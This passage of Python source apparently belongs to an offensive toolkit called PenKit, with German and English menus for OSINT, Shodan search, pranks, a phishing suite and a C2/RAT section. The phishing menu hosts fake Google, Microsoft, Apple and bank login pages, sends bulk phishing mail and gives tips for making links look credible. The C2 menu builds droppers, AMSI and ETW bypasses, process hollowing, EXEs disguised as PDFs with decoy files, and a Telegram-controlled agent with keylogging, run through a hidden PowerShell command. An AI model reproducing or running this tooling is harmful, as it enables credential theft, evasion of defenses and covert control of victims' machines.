            return

        clr()
        recon = OSINTRecon(cfg.get("output_dir", "/tmp"))

        if choice == "1":
            domain = ask("Target domain (example.com)", required=True)
            await run_tool_live(recon.harvest(domain))
        elif choice == "2":
            username = ask("Username", required=True)
            await run_tool_live(recon.sherlock(username))
        elif choice == "3":
            domain = ask("Target domain", required=True)
            await run_tool_live(recon.subdomain_enum(domain))
        elif choice == "4":
            domain = ask("Target domain", required=True)
            await run_tool_live(recon.print_dorks(domain))
        elif choice == "5":
            domain = ask("Target domain", required=True)
            username = ask("Username (optional)", "")
            await run_tool_live(recon.full_recon(domain, username))

        elif choice == "6":
            from tools.osint.shodan_lookup import ShodanLookup, PRESET_SEARCHES
            section("SHODAN SEARCH", "Google für Hacker — findet verwundbare Geräte weltweit")
            shodan = ShodanLookup()
            if not shodan.api_key:
                info_box([
                    "Shodan API-Key empfohlen für volle Funktionalität.",
                    "Kostenlos registrieren: https://account.shodan.io/",
                    "Ohne Key: nur Beispiel-Queries und ipinfo.io Fallback.",
                    "Key eingeben → dauerhaft gespeichert in ~/.penkit_shodan_key",
                ])
                setup = ask("API-Key jetzt eingeben? (j/n)", "n")
                if setup.lower() == "j":
                    key = ask("Shodan API-Key", required=True)
                    await run_tool_live(shodan.setup_key(key))

            print(f"\n  {C}Preset-Suchen:{R}")
            for i, (name, q) in enumerate(list(PRESET_SEARCHES.items())[:8], 1):
                print(f"  {DIM}[{i}]{R}  {name:<30}  {DIM}{q}{R}")
            print()

            query = ask("Shodan Query (leer = eigener, 1-8 = Preset)", "")
            if query.isdigit() and 1 <= int(query) <= 8:
                query = list(PRESET_SEARCHES.values())[int(query)-1]
                print(f"  {DIM}Query: {query}{R}")

            country = ask("Auf Land einschränken (z.B. DE, leer = global)", "")
            limit = ask_int("Max. Ergebnisse", 20)
            print()
            await run_tool_live(shodan.search_with_python(query, limit, country))

        elif choice == "7":
            from tools.osint.shodan_lookup import ShodanLookup
            section("SHODAN IP LOOKUP", "Ports, Banner, CVEs, ISP zu einer IP")
            shodan = ShodanLookup()
            ip = ask("IP-Adresse", required=True)
            print()
            await run_tool_live(shodan.lookup_ip(ip))

        elif choice == "8":
            from tools.osint.shodan_lookup import ShodanLookup
            section("EIGENE EXTERNE IP", "Was sieht das Internet von deiner Kali-IP?")
            shodan = ShodanLookup()
            print()
            await run_tool_live(shodan.my_ip_info())

        wait_key()


async def menu_blueteam():
    from tools.blueteam import ArpWatcher, PortMonitor, AuthLogAnalyzer, Honeypot

    while True:
        banner()
        section("🔵  BLUE TEAM — DEFENSE")
        menu_item("1", "ARP Spoof Detector (live)",    "🟢")
        menu_item("2", "Auth Log — Historical Scan",   "🟢")
        menu_item("3", "Auth Log — Live Tail",         "🟢")
        menu_item("4", "Port Snapshot (baseline)",     "🟢")
        menu_item("5", "Port Diff (vs baseline)",      "🟢")
        menu_item("6", "Port Monitor (live)",          "🟢")
        menu_item("7", "Honeypot Suite",               "🟢")
        menu_item("0", "Back")

        choice = prompt("blue")
        if choice == "0":
            return

        clr()
        if choice == "1":
            iface = ask("Interface", "eth0")
            t = ArpWatcher(iface)
            print(f"\n{G}[*] Monitoring ARP traffic... Ctrl+C to stop{R}\n")
            try:
                await run_tool_live(t.watch())
            except KeyboardInterrupt:
                await t.stop()

        elif choice == "2":
            log = ask("Log path (empty = auto)", "")
            t = AuthLogAnalyzer()
            await run_tool_live(t.scan_historical(log))

        elif choice == "3":
            log = ask("Log path (empty = auto)", "")
            t = AuthLogAnalyzer()
            print(f"\n{G}[*] Live monitoring... Ctrl+C to stop{R}\n")
            try:
                await run_tool_live(t.live_tail(log))
            except KeyboardInterrupt:
                await t.stop()

        elif choice == "4":
            t = PortMonitor()
            await run_tool_live(t.snapshot())

        elif choice == "5":
            t = PortMonitor()
            await run_tool_live(t.diff())

        elif choice == "6":
            t = PortMonitor()
            print(f"\n{G}[*] Live port monitoring... Ctrl+C to stop{R}\n")
            try:
                await run_tool_live(t.live_watch())
            except KeyboardInterrupt:
                await t.stop()

        elif choice == "7":
            ssh  = ask_int("Fake SSH port",    2222)
            http = ask_int("Fake HTTP port",   8888)
            ftp  = ask_int("Fake FTP port",    2121)
            tel  = ask_int("Fake Telnet port", 2323)
            thr  = ask_int("Alert threshold",  3)
            t = Honeypot(ssh, http, ftp, tel, thr)
            print(f"\n{G}[*] Honeypot active... Ctrl+C to stop{R}\n")
            try:
                await run_tool_live(t.start())
            except KeyboardInterrupt:
                await t.stop()

        wait_key()


async def menu_joker():
    from tools.joker import KahootFlooder, GoogleFormsBomber, PrankPayloadGenerator
    from core.config import load
    cfg = load()

    while True:
        banner()
        section("🃏  JOKER — PRANKS & FUN")
        menu_item("1", "Kahoot Flooder",         "🟡")
        menu_item("2", "Google Forms Bomber",    "🟡")
        menu_item("3", "Fake BSOD (Windows)",    "🟡")
        menu_item("4", "Fake Virus Scan",        "🟡")
        menu_item("5", "Fake Windows Update",    "🟡")
        menu_item("6", "Rickroll",               "🟡")
        menu_item("7", "100 Browser Tabs",       "🟡")
        menu_item("8", "Disco Terminal (Linux)", "🟢")
        menu_item("0", "Back")

        choice = prompt("joker")
        if choice == "0":
            return

        clr()
        out = cfg.get("output_dir", "/tmp")

        if choice == "1":
            pin    = ask("Kahoot PIN", required=True)
            count  = ask_int("Number of bots", 100)
            prefix = ask("Name prefix (empty = random)", "")
            t = KahootFlooder()
            try:
                await run_tool_live(t.flood(pin, count, prefix))
            except KeyboardInterrupt:
                await t.stop()

        elif choice == "2":
            url    = ask("Google Form URL", required=True)
            count  = ask_int("Submissions", 50)
            answer = ask("Custom answer (empty = random)", "")
            t = GoogleFormsBomber()
            try:
                await run_tool_live(t.bomb_google(url, count, answer))
            except KeyboardInterrupt:
                await t.stop()

        else:
            prank_map = {
                "3": "fake_bsod", "4": "fake_virus_win",
                "5": "fake_update", "6": "rickroll",
                "7": "100_tabs", "8": "disco_terminal",
            }
            prank_id = prank_map.get(choice)
            if prank_id:
                delay = ask_int("Delay before activation (sec)", 0)
                custom = ask("Tab count (only for option 7)", "100") if choice == "7" else ""
                gen = PrankPayloadGenerator()
                await run_tool_live(gen.generate(prank_id, out, delay, custom))

        wait_key()


async def menu_phishing():
    banner()
    section("🎣  PHISHING SUITE", "Fake Login Pages · Email-Kampagnen · Credential Capture")
    print(f"  {RD}{B}⛔  NUR auf autorisierten Zielen verwenden!{R}\n")

    menu_item(" 1", "🌐  Phishing-Server starten",      "⛔", "Startet Fake-Login lokal, zeigt Credentials live an")
    menu_item(" 2", "📧  Email-Kampagne senden",         "⛔", "Bulk-Phishing via SMTP mit HTML-Templates")
    menu_item(" 3", "🔗  GoPhish Integration",           "⛔", "Professionelle Kampagnen via GoPhish API")
    menu_item(" 4", "📄  Verfügbare Seiten anzeigen",    "🟡", "Google, Microsoft, Instagram, Apple, Bank")
    menu_item(" 5", "📋  Gespeicherte Credentials",      "🟡", "Zeigt alle gefangenen Passwörter aus letztem Run")
    print()
    menu_item(" 0", "← Zurück", "")
    print()

    choice = prompt("phishing")
    if choice == "0":
        return

    elif choice == "1":
        banner()
        section("🌐  PHISHING-SERVER", "Fake Login Page lokal hosten")
        info_box([
            "Startet einen HTTP-Server auf deiner Kali-Maschine.",
            "Der Link (z.B. http://192.168.1.10:8080) wird an das Opfer geschickt.",
            "Wenn das Opfer seine Daten eingibt → sofort sichtbar im Terminal + gespeichert.",
            "",
            "Tipp: Nutze einen URL-Shortener (bit.ly, t.ly) damit der Link glaubwürdiger aussieht.",
        ])
        print()
        info_box([
            "Verfügbare Seiten:",
            "  google    — Google Konto Login",
            "  microsoft — Microsoft / Office 365",
            "  instagram — Instagram",
            "  apple     — Apple ID / iCloud",
            "  bank      — Generisches Online-Banking",
        ])
        page = prompt("Seite [google/microsoft/instagram/apple/bank]  (Enter = google)") or "google"
        info_box([
            "Port = auf welchem Port der Server läuft",
            "  8080 = Standard, kein root nötig",
            "  80   = Standard HTTP (wirkt echter), braucht root",
            "  443  = HTTPS (braucht root + --https Flag)",
        ])
        try:
            port = int(prompt("Port  (Enter = 8080)") or "8080")
        except ValueError:
            port = 8080
        use_https = prompt("HTTPS? [j/n]  (Enter = n)").lower() in ("j", "y", "ja", "yes")
        info_box([
            "Redirect-URL = wohin das Opfer nach dem Login weitergeleitet wird",
            "  → Sollte die echte Seite sein damit kein Verdacht entsteht",
            "  → z.B. https://accounts.google.com  oder  https://www.instagram.com",
        ])
        redirect = prompt("Redirect-URL nach Login  (Enter = echte Seite)") or ""
        if not redirect:
            defaults = {"google": "https://accounts.google.com", "microsoft": "https://outlook.com",
                        "instagram": "https://www.instagram.com", "apple": "https://appleid.apple.com",
                        "bank": "https://www.google.com"}
            redirect = defaults.get(page, "https://google.com")

        print(f"\n  {RD}⛔  Tippe:{R}  {W}I confirm authorized use{R}\n")
        if prompt("Bestätigung").strip().lower() != "i confirm authorized use":
            print(f"  {Y}[!] Abgebrochen.{R}")
            wait_key()
            return
        print()
        try:
            from tools.phishing.server import PhishingServer
            srv = PhishingServer(page=page, port=port, use_https=use_https, redirect_url=redirect)
            await run_tool_live(srv.start())
        except Exception as e:
            print(f"  {RD}[!] {e}{R}")
        wait_key()

    elif choice == "2":
        banner()
        section("📧  EMAIL-KAMPAGNE", "Phishing-Mails per SMTP verschicken")
        info_box([
            "Verschickt personalisierte Phishing-Emails an eine Zielliste.",
            "",
            "SMTP-Presets:",
            "  gmail    — smtp.gmail.com:587  (App-Passwort nötig!)",
            "  outlook  — smtp-mail.outlook.com:587",
            "  sendgrid — smtp.sendgrid.net:587  (API-Key als Passwort)",
            "  local    — 127.0.0.1:25  (Postfix auf Kali: apt install postfix)",
            "",
            "Gmail App-Passwort: Google-Konto → Sicherheit → App-Passwörter",
        ])
        print()
        from tools.phishing.smtp_sender import SMTP_PRESETS, SMTPConfig, SMTPSender
        preset_name = prompt("Preset [gmail/outlook/sendgrid/local] oder leer für manuell")
        if preset_name in SMTP_PRESETS:
            p = SMTP_PRESETS[preset_name]
            smtp_host = p["host"]
            smtp_port = p["port"]
            use_tls   = p["use_tls"]
            print(f"  {G}[*] {p['note']}{R}")
        else:
            smtp_host = prompt("SMTP Host  (z.B. smtp.gmail.com)")
            try:
                smtp_port = int(prompt("SMTP Port  (z.B. 587)") or "587")
            except ValueError:
                smtp_port = 587
            use_tls = prompt("TLS verwenden? [j/n]").lower() in ("j", "y", "ja")

        smtp_user = prompt("SMTP Benutzername / Email")
        smtp_pass = prompt("SMTP Passwort / App-Passwort")
        from_addr = prompt(f"Absender-Adresse  (Enter = {smtp_user})") or smtp_user

        info_box([
            "Zielliste = Textdatei mit einer Email pro Zeile,",
            "  oder CSV mit Spalten 'email' und 'name' für Personalisierung.",
            "  Beispiel TXT:  /root/targets.txt",
            "  Beispiel CSV:  /root/targets.csv  (email,name)",
        ])
        targets_path = prompt("Pfad zur Zielliste (.txt oder .csv)")
        if not targets_path or not os.path.exists(targets_path):
            print(f"  {Y}[!] Datei nicht gefunden.{R}")
            wait_key()
            return

        info_box([
            "Email-Templates:",
            "  google_security  — Google Sicherheitswarnung",
            "  microsoft_mfa    — Microsoft Konto-Verifizierung",
            "  instagram_login  — Instagram Anmeldeversuch",
            "  it_department    — IT-Abteilung: Passwort läuft ab",
            "  bank_suspicious  — Bank: verdächtige Transaktion",
        ])
        template = prompt("Template  (Enter = google_security)") or "google_security"

        info_box([
            "Phishing-URL = der Link in der Email, der zur Fake-Login-Page führt.",
            "  → Dein Kali muss erreichbar sein (Port offen, IP bekannt)",
            "  → Beispiel: http://192.168.1.10:8080/?page=google",
            "  → Tipp: URL-Shortener (bit.ly) macht es glaubwürdiger",
        ])
        phish_url = prompt("Phishing-URL")
        if not phish_url:
            print(f"  {Y}[!] URL ist Pflicht.{R}")
            wait_key()
            return

        try:
            delay = float(prompt("Verzögerung zwischen Mails in Sekunden  (Enter = 2)") or "2")
        except ValueError:
            delay = 2.0

        print(f"\n  {RD}⛔  Tippe:{R}  {W}I confirm authorized use{R}\n")
        if prompt("Bestätigung").strip().lower() != "i confirm authorized use":
            print(f"  {Y}[!] Abgebrochen.{R}")
            wait_key()
            return

        print()
        try:
            cfg    = SMTPConfig(smtp_host, smtp_port, smtp_user, smtp_pass, use_tls)
            sender = SMTPSender(cfg)
            await run_tool_live(sender.send_campaign(targets_path, template, phish_url, from_addr, delay))
        except Exception as e:
            print(f"  {RD}[!] {e}{R}")
        wait_key()

    elif choice == "3":
        banner()
        section("🔗  GOPHISH INTEGRATION", "Professionelle Kampagnen-Verwaltung")
        info_box([
            "GoPhish = professionelles Open-Source Phishing-Framework.",
            "",
            "Installation auf Kali:",
            "  cd /opt && wget https://github.com/gophish/gophish/releases/latest/download/gophish-v0.12.1-linux-64bit.zip",
            "  unzip gophish-*.zip && chmod +x gophish && ./gophish",
            "",
            "GoPhish gibt beim Start einen API-Key aus (z.B. 4304d5755...)",
            "Admin-UI: https://127.0.0.1:3333  (admin / gophish)",
        ])
        print()
        api_key = prompt("GoPhish API-Key")
        if not api_key:
            print(f"  {Y}[!] API-Key ist Pflicht.{R}")
            wait_key()
            return
        try:
            from tools.phishing.gophish_engine import GoPhishEngine
            engine = GoPhishEngine(api_key)
            await run_tool_live(engine.check_connection())
            print()
            print(f"  {G}[*] Für Kampagnen-Management → GoPhish Admin-UI öffnen:{R}")
            print(f"  {C}  https://127.0.0.1:3333{R}")
            print(f"  {DIM}  Username: admin  |  Passwort: gophish (beim ersten Start ändern){R}")
        except Exception as e:
            print(f"  {RD}[!] {e}{R}")
        wait_key()

    elif choice == "4":
        banner()
        section("📄  VERFÜGBARE FAKE-LOGIN-SEITEN", "")
        from tools.phishing.pages import PAGES, PAGE_DESCRIPTIONS
        print()
        for name, desc in PAGE_DESCRIPTIONS.items():
            print(f"  {G}●{R}  {C}{name:<12}{R}  {W}{desc}{R}")
        print()
        print(f"  {DIM}Aufruf: http://<kali-ip>:<port>/?page=<name>{R}")
        wait_key()

    elif choice == "5":
        banner()
        section("📋  GESPEICHERTE CREDENTIALS", "")
        log = "/tmp/penkit_phish_creds.json"
        if not os.path.exists(log):
            print(f"  {Y}[!] Noch keine Credentials gefangen.{R}")
            print(f"  {DIM}Starte zuerst den Phishing-Server (Option 1){R}")
        else:
            import json as _json
            with open(log) as f:
                creds = _json.load(f)
            if not creds:
                print(f"  {Y}[*] Log-Datei leer.{R}")
            else:
                print(f"  {G}[+] {len(creds)} Credential(s) gefangen:\n{R}")
                for i, c in enumerate(creds, 1):
                    print(f"  {G}[{i}]{R}  {Y}{c['ip']:<16}{R}  {W}{c['username']:<30}{R}  {RD}{c['password']}{R}")
                    print(f"       {DIM}{c['timestamp']}  —  {c.get('page','?')}{R}")
                    print()
        wait_key()


async def menu_c2():
    banner()
    section("💀  C2 / RAT — WINDOWS PAYLOADS", "Command & Control · AV Evasion · Reverse Shell")
    print(f"  {RD}{B}⛔  NUR auf eigenen / autorisierten Geräten verwenden!{R}\n")

    menu_item(" 1", "🔨  Full Payload Package bauen",     "⛔", "Erstellt PS1 + HTA + BAT + Macro + ANLEITUNG.txt")
    menu_item(" 2", "🛡️   AMSI Bypass",                    "🔴", "Schaltet Windows Defender Scanning ab (PowerShell)")
    menu_item(" 3", "👁️   ETW Bypass",                     "🔴", "Macht Windows Event-Logging blind")
    menu_item(" 4", "🔀  AMSI + ETW kombiniert",           "🔴", "Beide Bypasses + ScriptBlock Logging in einem Befehl")
    menu_item(" 5", "💉  Process Hollowing",               "⛔", "Shellcode in svchost.exe einschleusen (RAM only)")
    menu_item(" 6", "🎭  Als PDF/Foto/Word tarnen",        "⛔", "EXE mit echtem Icon, öffnet Decoy-Datei zur Tarnung")
    menu_item(" 7", "📱  Telegram C2 Agent generieren",   "⛔", "PS1 das Befehle via Telegram empfängt + ausführt")
    menu_item(" 8", "🤖  Telegram Bot Setup",             "🔴", "Bot-Token verifizieren + Chat-ID herausfinden")
    menu_item(" 9", "🎣  Reverse Shell Listener",         "🔴", "Empfängt eingehende Shells (pwncat/nc/msf/socat)")
    menu_item(" E", "🔮  Advanced Evasion Builder",       "⛔", "DLL Unhooking + Direct Syscalls + Sleep Obfuscation")
    menu_item(" D", "🌐  DNS C2 Tunneling",               "⛔", "C2 über DNS Port 53 — bypassed jede Firewall")
    print()
    menu_item(" 0", "← Zurück", "")
    print()

    choice = prompt("c2")
    if choice == "0":
        return

    elif choice == "1":
        banner()
        section("🔨  FULL PAYLOAD PACKAGE", "Erstellt alle Delivery-Methoden + Schritt-für-Schritt ANLEITUNG")
        info_box([
            "Was wird gebaut:",
            "  payload.ps1        — polymorphes PowerShell (AMSI+ETW bypass eingebaut)",
            "  payload_hollow.ps1 — Process Hollowing Variante (läuft in svchost)",
            "  dropper.hta        — Doppelklick-Datei → Payload startet sofort",
            "  dropper.bat        — BAT-Datei für USB / freigegebene Ordner",
            "  macro_template.vba — Word/Excel Macro (in VBA Editor einfügen)",
            "  stager_url.ps1     — Fileless: lädt Payload in RAM, NICHTS auf Disk",
            "  README_ANLEITUNG.txt — Komplette Schritt-für-Schritt Anleitung auf Deutsch",
        ])
        print()
        info_box([
            "LHOST = deine Kali IP-Adresse (wo der Listener läuft)",
            "  → Kali IP findest du mit: ip a | grep 192",
            "  → Beispiel: 192.168.1.10",
        ])
        lhost = prompt("LHOST — deine Kali IP (z.B. 192.168.1.10)")
        if not lhost:
            print(f"  {Y}[!] LHOST ist Pflicht.{R}")
            wait_key()
            return
        print()
        info_box([
            "LPORT = Port auf dem Kali lauscht (du kannst frei wählen)",
            "  → Empfohlen: 443 (sieht aus wie HTTPS, wird selten blockiert)",
            "  → Alternativ: 4444, 8443, 8080",
            "  → Dieser Port muss in der Firewall offen sein: ufw allow <PORT>",
        ])
        try:
            lport = int(prompt("LPORT — Listener-Port (default: 443)") or "443")
        except ValueError:
            lport = 443

        print(f"\n  {RD}{B}⛔  SICHERHEITSABFRAGE{R}")
        print(f"  {Y}Tippe exakt:{R}  {W}I confirm this is my authorized device{R}\n")
        confirm = prompt("Bestätigung")
        if confirm.strip().lower() != "i confirm this is my authorized device":
            print(f"\n  {Y}[!] Falsche Eingabe — abgebrochen.{R}")
            wait_key()
            return

        print()
        try:
            from tools.c2.payload_builder import PayloadBuilder, BuildConfig
            cfg = BuildConfig(lhost=lhost, lport=lport)
            builder = PayloadBuilder(cfg)
            async for line in builder.build():
                print_output_line(line)
        except Exception as e:
            print(f"  {RD}[!] Fehler: {e}{R}")
        wait_key()

    elif choice == "2":
        banner()
        section("🛡️  AMSI BYPASS", "Anti-Malware Scan Interface deaktivieren")
        info_box([
            "AMSI = Windows-Schnittstelle die PowerShell-Befehle an Defender weitergibt.",
            "Dieser Bypass patcht AMSI im Speicher → Defender sieht den Code nicht mehr.",
            "",
            "Methoden:",
            "  reflection    — ändert AMSI-Flag via .NET Reflection (sehr zuverlässig, default)",
            "  memory_patch  — überschreibt AmsiScanBuffer direkt im RAM (noch stärker)",
            "",
            "Den generierten Befehl auf dem Ziel-PC in PowerShell ausführen.",
        ])
        print()
        method = prompt("Methode [reflection / memory_patch]  (Enter = reflection)") or "reflection"
        try:
            from tools.c2.amsi_bypass import build_amsi_bypass
            cmd = build_amsi_bypass(method)
            print(f"\n  {G}[+] Fertig! Diesen Befehl auf dem Ziel-PC ausführen:{R}\n")
            print(f"  {C}{cmd}{R}\n")
            print(f"  {DIM}Danach kannst du beliebigen PS-Code ohne Defender-Erkennung ausführen.{R}")
        except Exception as e:
            print(f"  {RD}[!] {e}{R}")
        wait_key()

    elif choice == "3":
        banner()
        section("👁️  ETW BYPASS", "Windows Event Tracing abschalten")
        info_box([
            "ETW = Event Tracing for Windows — protokolliert ALLE PowerShell-Aktionen.",
            "Dieser Bypass patcht EtwEventWrite in ntdll.dll → alle Logs blind.",
            "Wirkung: EDR, SIEM und Windows Event Viewer sehen nichts mehr.",
            "",
            "Kein Input nötig — Befehl wird direkt generiert und angezeigt.",
        ])
        print()
        try:
            from tools.c2.amsi_bypass import build_etw_bypass
            cmd = build_etw_bypass()
            print(f"  {G}[+] Diesen Befehl auf dem Ziel-PC ausführen:{R}\n")
            print(f"  {C}{cmd}{R}\n")
        except Exception as e:
            print(f"  {RD}[!] {e}{R}")
        wait_key()

    elif choice == "4":
        banner()
        section("🔀  AMSI + ETW KOMBINIERT", "Alle Bypasses in einem einzigen Befehl")
        info_box([
            "Kombiniert in einem Base64-codierten PowerShell-Befehl:",
            "  ✓  AMSI Bypass    → Defender sieht deinen Code nicht",
            "  ✓  ETW Bypass     → Windows Logs blind",
            "  ✓  ScriptBlock    → PS-Verlaufs-Logging deaktiviert",
            "",
            "Das ist der empfohlene erste Schritt vor jeder weiteren Aktion.",
            "Kein Input nötig — direkt kopieren und auf Ziel ausführen.",
        ])
        print()
        try:
            from tools.c2.amsi_bypass import build_combined_bypass
            cmd = build_combined_bypass()
            print(f"  {G}[+] Alles-in-einem Bypass — auf Ziel ausführen:{R}\n")
            print(f"  {C}{cmd}{R}\n")
        except Exception as e:
            print(f"  {RD}[!] {e}{R}")
        wait_key()

    elif choice == "5":
        banner()
        section("💉  PROCESS HOLLOWING", "Shellcode in legitimen Windows-Prozess einschleusen")
        info_box([
            "Process Hollowing = Payload wird in svchost.exe / RuntimeBroker.exe injiziert.",
            "Im Task-Manager sieht man nur einen normalen Windows-Prozess — kein Verdacht.",
            "Der Shellcode läuft komplett im RAM — keine Datei auf der Festplatte.",
            "",
            "LHOST = deine Kali IP  (wo Metasploit lauscht)",
            "LPORT = dein Listener-Port  (gleich wie im Metasploit handler)",
            "",
            "Wichtig: Demo-Shellcode (NOP sled) wird eingebaut.",
            "Ersetze mit echtem msfvenom-Shellcode — steht in der ANLEITUNG.",
        ])
        print()
        info_box([
            "LHOST = deine Kali IP  →  ip a | grep 192",
        ])
        lhost = prompt("LHOST — Kali IP (z.B. 192.168.1.10)")
        if not lhost:
            print(f"  {Y}[!] Pflichtfeld.{R}")
            wait_key()
            return
        info_box([
            "LPORT = Port auf dem Metasploit lauscht  →  Empfohlen: 443",
        ])
        try:
            lport = int(prompt("LPORT (default: 443)") or "443")
        except ValueError:
            lport = 443
        print(f"\n  {RD}⛔  Tippe:{R}  {W}I own this device{R}\n")
        if prompt("Bestätigung").strip().lower() != "i own this device":
            print(f"  {Y}[!] Abgebrochen.{R}")
            wait_key()
            return
        try:
            from tools.c2.process_hollow import generate as ph_gen, HOLLOW_TARGETS
            import random as _r
            target = _r.choice(HOLLOW_TARGETS)
            code = ph_gen(b"\x90" * 8, target_process=target)
            out = f"/tmp/hollow_{lhost.replace('.','_')}_{lport}.ps1"
            with open(out, "w") as f:
                f.write(code)
            print(f"\n  {G}[+] Gespeichert: {out}{R}")
            print(f"  {C}[*] Ziel-Prozess: {target}{R}")
            print(f"  {DIM}Nächster Schritt: echten Shellcode einbauen — siehe Full Package ANLEITUNG{R}")
        except Exception as e:
            print(f"  {RD}[!] {e}{R}")
        wait_key()

    elif choice == "6":
        banner()
        section("🎭  PAYLOAD TARNEN", "Als PDF / Foto / Word-Datei verkleiden")
        info_box([
            "Erstellt eine EXE-Datei die aussieht wie eine PDF/Foto/Word-Datei:",
            "  → Echtes Icon (PDF-Symbol, Foto-Symbol, Word-Symbol)",
            "  → Öffnet gleichzeitig eine echte Decoy-Datei → kein Verdacht",
            "  → Payload läuft versteckt im Hintergrund",
            "",
            "Benötigt: pyinstaller  →  pip3 install pyinstaller --break-system-packages",
        ])
        print()
        info_box([
            "payload.ps1 = die PS1-Datei die du mit Option 1 gebaut hast",
            "  → Normalerweise in /tmp/penkit_c2_<ID>/payload.ps1",
        ])
        ps1_path = prompt("Pfad zur payload.ps1")
        if not ps1_path or not os.path.exists(ps1_path):
            print(f"  {Y}[!] Datei nicht gefunden: {ps1_path}{R}")
            wait_key()
            return
        info_box([
            "Tarnung wählen:",
            "  pdf   → sieht aus wie ein PDF-Dokument  (Standard, sehr glaubwürdig)",
            "  photo → sieht aus wie ein JPEG-Foto",
            "  word  → sieht aus wie ein Word-Dokument (.docx)",
        ])
        dtype = prompt("Tarnung [pdf / photo / word]  (Enter = pdf)") or "pdf"
        info_box([
            "Decoy-Datei (optional): eine echte PDF/Foto die beim Doppelklick geöffnet wird.",
            "  → Z.B. eine harmlose Rechnung, ein Urlaubsfoto, etc.",
            "  → Leer lassen wenn keine Decoy-Datei vorhanden.",
        ])
        decoy = prompt("Pfad zur Decoy-Datei  (Enter = keine)") or None
        if decoy and not os.path.exists(decoy):
            print(f"  {Y}[!] Decoy nicht gefunden — wird ignoriert.{R}")
            decoy = None
        out_dir = prompt("Ausgabe-Ordner  (Enter = /tmp)") or "/tmp"
        print()
        try:
            from tools.c2.disguise import build_disguised_exe
            async for line in build_disguised_exe(ps1_path, dtype, decoy, out_dir):
                print_output_line(line)
        except Exception as e:
            print(f"  {RD}[!] {e}{R}")
        wait_key()

    elif choice == "7":
        banner()
        section("📱  TELEGRAM C2 AGENT", "Windows PS1 das via Telegram gesteuert wird")
        info_box([
            "Der Agent läuft auf dem Ziel-Windows als PowerShell-Skript.",
            "Er fragt alle N Sekunden Telegram nach Befehlen — kein eingehender Port nötig.",
            "",
            "Was du brauchst:",
            "  1. Telegram Bot Token  → @BotFather auf Telegram → /newbot",
            "  2. Deine Chat-ID       → @userinfobot auf Telegram anschreiben",
            "",
            "Danach kannst du dem Bot direkt Befehle schicken:",
            "  !shell whoami   !screenshot   !sysinfo   !wifi   !keylog start   !help",
        ])
        print()

        # Gespeicherte Config laden falls vorhanden
        from tools.c2.telegram_bot import load_config, save_config
        saved = load_config()
        if saved:
            print(f"  {G}[*] Gespeicherte Config gefunden{R}  (Token: ...{saved[0][-8:]}  Chat: {saved[1]})")
            use_saved = prompt("Gespeicherte Config verwenden? [j/n]  (Enter = j)").lower()
            if use_saved not in ("n", "nein", "no"):
                token, chat_id = saved
            else:
                token = chat_id = ""
        else:
            token = chat_id = ""

        if not token:
            info_box([
                "Bot-Token = langer String den @BotFather gibt, z.B.:",
                "  1234567890:ABCdefGHijklMNOpqrSTUvwxYZ-abc123",
            ])
            token = prompt("Bot-Token")
            if not token:
                wait_key(); return

        if not chat_id:
            info_box([
                "Chat-ID = deine persönliche Telegram-ID, z.B. 123456789",
                "  → Schreibe @userinfobot auf Telegram, er antwortet mit deiner ID",
                "  → ODER nutze Option 8 (Bot Setup) um sie automatisch zu finden",
            ])
            chat_id = prompt("Chat-ID  (deine Telegram-Nutzer-ID)")
            if not chat_id:
                wait_key(); return

        try:
            interval = int(prompt("Polling-Intervall in Sekunden  (Enter = 10)") or "10")
        except ValueError:
            interval = 10

        save_config(token, chat_id)

        print(f"\n  {RD}⛔  Tippe:{R}  {W}I confirm authorized use{R}\n")
        if prompt("Bestätigung").strip().lower() != "i confirm authorized use":
            print(f"  {Y}[!] Abgebrochen.{R}")
            wait_key()
            return

        print()
        try:
            from tools.c2.telegram_agent import generate as ag_gen
            ps1_code = ag_gen(token, chat_id, interval)
            out_path = f"/tmp/penkit_agent_{chat_id}.ps1"
            with open(out_path, "w") as f:
                f.write(ps1_code)
            print(f"  {G}[+] Agent gespeichert: {out_path}{R}")
            print(f"  {G}[+] Größe: {len(ps1_code)} Zeichen{R}")
            print()
            print(f"  {C}Auf dem Ziel-PC ausführen:{R}")
            print(f"  {W}  powershell -ep bypass -w hidden -File agent.ps1{R}")
            print()
            print(f"  {DIM}Agent fragt alle {interval}s nach Befehlen.{R}")
            print(f"  {DIM}Schreibe dem Bot auf Telegram: !help{R}")
        except Exception as e:
            print(f"  {RD}[!] {e}{R}")
        wait_key()

    elif choice == "8":
        banner()
        section("🤖  TELEGRAM BOT SETUP", "Token verifizieren + Chat-ID finden")
        info_box([
            "Schritt 1: Bot erstellen",
            "  → Öffne Telegram → suche @BotFather → schreibe /newbot",
            "  → Gib dem Bot einen Namen (z.B. 'MyHelper') und Username (z.B. 'myhelper_bot')",
            "  → BotFather gibt dir den Token (langer String mit :)",
            "",
            "Schritt 2: Chat-ID finden",
            "  → Schreibe deinem neuen Bot eine beliebige Nachricht",
            "  → PenKit findet die Chat-ID automatisch",
        ])
        print()
        token = prompt("Bot-Token")
        if not token:
            wait_key()
            return
        print()
        try:
            from tools.c2.telegram_bot import setup_bot, get_chat_id, BotConfig, save_config
            # Erst Token verifizieren
            async for line in setup_bot(BotConfig(token=token, chat_id="")):
                print_output_line(line)
                if "ungültig" in line.lower():
                    wait_key()
                    return
            print()
            print(f"  {Y}[*] Schreibe jetzt dem Bot eine Nachricht auf Telegram (z.B. 'hallo'){R}")
            print(f"  {DIM}  Dann Enter drücken...{R}")
            input()
            print()
            found_id = ""
            async for line in get_chat_id(token):
                print_output_line(line)
                if "Chat-ID gefunden:" in line:
                    import re
                    m = re.search(r'Chat-ID gefunden:\s*(-?\d+)', line)
                    if m:
                        found_id = m.group(1)
            if found_id:
                save_config(token, found_id)
                print(f"\n  {G}[+] Config gespeichert!{R}")
                print(f"  {C}Token  : {token[:20]}...{R}")
                print(f"  {C}Chat-ID: {found_id}{R}")
                print(f"\n  {DIM}Jetzt C2 → Agent generieren (Option 7){R}")
        except Exception as e:
            print(f"  {RD}[!] {e}{R}")
        wait_key()

    elif choice == "9":
        banner()
        section("🎣  REVERSE SHELL LISTENER", "Empfängt eingehende Shells von Ziel-Systemen")
        info_box([
            "Der Listener wartet auf eine eingehende Verbindung vom Ziel-PC.",
            "LHOST = deine Kali IP  |  LPORT = Port auf dem du lauschst",
            "",
            "Listener-Typen:",
            "  pwncat-cs  → modernster Listener: Auto-PTY, Datei-Upload, PrivEsc",
            "  netcat     → klassisch, überall verfügbar, einfach",
            "  msfconsole → für Meterpreter-Payloads",
            "  socat TLS  → verschlüsselt, bypassed IDS/IPS",
            "",
